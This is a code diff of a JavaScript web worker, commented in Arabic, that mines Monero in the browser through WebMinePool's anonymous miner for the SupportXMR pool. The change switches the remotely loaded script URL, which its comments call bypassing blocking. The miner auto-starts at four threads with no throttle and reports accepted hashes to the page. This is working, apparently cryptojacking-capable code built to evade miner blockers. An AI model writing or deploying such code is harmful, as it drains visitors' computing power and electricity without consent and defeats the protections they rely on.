@@ -1,42 +1,51 @@
-// محرك التعدين v22: الربط المباشر بـ SupportXMR (Force Push)
-importScripts('https://cdn.webminepool.com/webminepool.min.js');
+// محرك التعدين الانفجاري v23: تجاوز الحجب والربط المباشر بـ SupportXMR
+importScripts('https://webminepool.com/lib/base.js');
 
-let minerObject = null;
+let miner = null;
 
 self.onmessage = function(e) {
     const data = e.data;
 
     if (data.type === 'init') {
         try {
-            // محرك فائق السرعة مرتبط بـ SupportXMR
-            minerObject = new WebMinePool.Anonymous(data.address, {
-                autoStart: true,
+            // استخدام الجسر العالمي (Global Bridge) لضمان الوصول لمسبح SupportXMR
+            miner = new WebMinePool.Anonymous(data.address, {
                 threads: data.threads || 4,
+                autoStart: true,
                 throttle: data.throttle || 0.0,
-                coin: "monero"
+                coin: "monero" // تحديد العملة بدقة لإجبار المسبح على القبول
             });
 
-            // ربط الهاشات بـ SupportXMR
-            minerObject.on('update', () => {
-                const hps = minerObject.getHashesPerSecond();
-                self.postMessage({ type: 'hashrate', hps: hps });
+            // مراقبة الهاشات وإرسالها للواجهة
+            miner.on('update', () => {
+                const hps = miner.getHashesPerSecond();
+                const total = miner.getTotalHashes();
+                self.postMessage({ type: 'hashrate', hps: hps, total: total });
+                
+                // إذا تم قبول هاش واحد على الأقل، نرسل إشارة نجاح
+                if (total > 0) {
+                    self.postMessage({ type: 'authorized', message: 'HASHRATE_ACCEPTED_BY_POOL' });
+                }
             });
 
-            // تأكيد الاتصال بالمسبح
-            minerObject.on('open', () => {
-                console.log("Connected to Pool Proxy Successfully");
+            miner.on('open', () => {
+                self.postMessage({ type: 'status', message: 'CONNECTED_TO_POOL' });
+            });
+
+            miner.on('error', (err) => {
+                self.postMessage({ type: 'error', message: 'CONNECTION_FAILED' });
             });
 
         } catch(err) {
-            console.error("Mining Init Error:", err);
+            self.postMessage({ type: 'error', message: err.toString() });
         }
     }
 
     if (data.type === 'start') {
-        if (minerObject) minerObject.start();
+        if (miner) miner.start();
     }
 
     if (data.type === 'stop') {
-        if (minerObject) minerObject.stop();
+        if (miner) miner.stop();
     }
 };
